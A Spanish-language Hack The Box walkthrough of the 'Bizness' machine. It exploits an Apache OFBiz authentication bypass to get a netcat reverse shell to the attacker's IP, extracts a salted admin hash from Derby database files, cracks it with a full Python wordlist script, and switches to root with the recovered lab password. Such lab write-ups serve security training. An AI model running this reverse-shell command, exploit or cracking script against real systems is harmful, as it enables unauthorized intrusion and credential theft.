
# Bizness

<figure><img src="/files/6dbcxhpd3IKClplo0ZcG" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Primer acceso</mark>

Accedemos a la IP `10.10.11.252` a través del navegador. Está bloqueado de inicio así que añadimos el dominio `https://bizness.htb` a nuestro `/etc/hosts`

<figure><img src="/files/10bejabsW5OFqNFsjKv9" alt=""><figcaption></figcaption></figure>

Parece una web de servicios de tecnología. Es una landing page sin ningún enlace y solamente tiene un formulario que no envía nada, no tiene funcionalidad. Esta web utiliza la versión 1.18.0 de Nginx, por lo que podríamos buscar un exploit público:

<figure><img src="/files/oNrecaZYa7Dbpyp19gUf" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -sC 10.10.11.252
```

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp  open  http     nginx 1.18.0
443/tcp open  ssl/http nginx 1.18.0
```

En principio no encontramos nada relevante, solo tiene abiertos los puertos típicos.

## <mark style="color:purple;">Fuzzing</mark>

Haciendo fuzzing con dirsearch, encontramos un directorio de login en `/control/login`, lo que puede ser nuestro punto de acceso:

```bash
sudo apt-get install dirsearch
dirsearch -u https://bizness.htb -x 403,404
```

<figure><img src="/files/YexjOw7RZJnIIfVLtHAO" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/VTFrCd13EgVjDW3LxPCu" alt=""><figcaption></figcaption></figure>

Vemos que este login usa Apache OFBiz, por lo que vamos a buscar un exploit.

## <mark style="color:purple;">Exploit</mark>

Haciendo un poco de research, encontré el siguiente exploit:

{% embed url="<https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass?source=post_page-----d75eab167006-------------------------------->" %}

Solamente necesitamos abrir un listener de netcat y ejecutar el siguiente comando:

```bash
nc -nlvp 4444
```

```bash
python3 exploit.py --url https://bizness.htb/ --cmd 'nc -c bash 10.10.15.62 4444' 
```

<figure><img src="/files/OWEGY8oF86pgR60DDFLw" alt=""><figcaption></figcaption></figure>

Obtenemos el user.txt:

<figure><img src="/files/IfFMx2H82OmfHAmsCS3h" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escalada de Privilegios</mark>

En la siguiente ruta encontramos la contraseña hasheada:

```
/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml
```

<figure><img src="/files/GpKN7LlU1uvPNroXI0QS" alt=""><figcaption></figcaption></figure>

Hemos descubierto el password pero para crackearlo necesitamos el SALT. Haciendo research dentro de la máquina, encontramos el siguiente directorio que contiene el SALT:

```
/opt/ofbiz/runtime/data/derby/ofbiz/seg0
```

<figure><img src="/files/mIFTCc6CEyv682ZxL3Zl" alt=""><figcaption></figcaption></figure>

Hay un montón de archivos .dat, por lo que tendremos que aplicar algún filtro para encontrar el hash del administrador, por lo que vamos a aplicar el siguiente filtro:

```bash
grep -r -l "admin" *.dat
```

<figure><img src="/files/FTMgimFyhPIV7bZl3MHy" alt=""><figcaption></figcaption></figure>

Enumerando uno a uno los archivos, concontramos el que tiene el hash: `c6650.dat`

<figure><img src="/files/U8dxdrcQw104QWwLo0IA" alt=""><figcaption></figcaption></figure>

```
admin$"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN
```

Para crackear este tipo de hash voy a utilizar el siguiente script:

{% code title="bizness.py" %}

```python
import hashlib
import base64
import os
from tqdm import tqdm

class PasswordEncryptor:
    def __init__(self, hash_type="SHA", pbkdf2_iterations=10000):
        """
        Initialize the PasswordEncryptor object with a hash type and PBKDF2 iterations.

        :param hash_type: The hash algorithm to use (default is SHA).
        :param pbkdf2_iterations: The number of iterations for PBKDF2 (default is 10000).
        """
        self.hash_type = hash_type
        self.pbkdf2_iterations = pbkdf2_iterations

    def crypt_bytes(self, salt, value):
        """
        Crypt a password using the specified hash type and salt.

        :param salt: The salt used in the encryption.
        :param value: The password value to be encrypted.
        :return: The encrypted password string.
        """
        if not salt:
            salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
        hash_obj = hashlib.new(self.hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        result = f"${self.hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
        return result

    def get_crypted_bytes(self, salt, value):
        """
        Get the encrypted bytes for a password.

        :param salt: The salt used in the encryption.
        :param value: The password value to get encrypted bytes for.
        :return: The encrypted bytes as a string.
        """
        try:
            hash_obj = hashlib.new(self.hash_type)
            hash_obj.update(salt.encode('utf-8'))
            hash_obj.update(value)
            hashed_bytes = hash_obj.digest()
            return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')
        except hashlib.NoSuchAlgorithmException as e:
            raise Exception(f"Error while computing hash of type {self.hash_type}: {e}")

# Example usage:
hash_type = "SHA1"
salt = "d"
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
wordlist = '/usr/share/wordlists/rockyou.txt'

# Create an instance of the PasswordEncryptor class
encryptor = PasswordEncryptor(hash_type)

# Get the number of lines in the wordlist for the loading bar
total_lines = sum(1 for _ in open(wordlist, 'r', encoding='latin-1'))

# Iterate through the wordlist with a loading bar and check for a matching password
with open(wordlist, 'r', encoding='latin-1') as password_list:
    for password in tqdm(password_list, total=total_lines, desc="Processing"):
        value = password.strip()
        
        # Get the encrypted password
        hashed_password = encryptor.crypt_bytes(salt, value.encode('utf-8'))
        
        # Compare with the search hash
        if hashed_password == search:
            print(f'Found Password:{value}, hash:{hashed_password}')
            break  # Stop the loop if a match is found
```

{% endcode %}

<figure><img src="/files/deAg3fV1nu76fr3oQjbw" alt=""><figcaption></figcaption></figure>

Conseguimos desencriptar la contraseña!

```
monkeybizness
```

Ahora para cambiar al usuario root sería tan simple como lo siguiente:

```
su
monkeybizness
```

<figure><img src="/files/M8FpE9FLvKhmDwAX43kt" alt=""><figcaption></figcaption></figure>

Y finalmente obtenemos la root flag 🏆
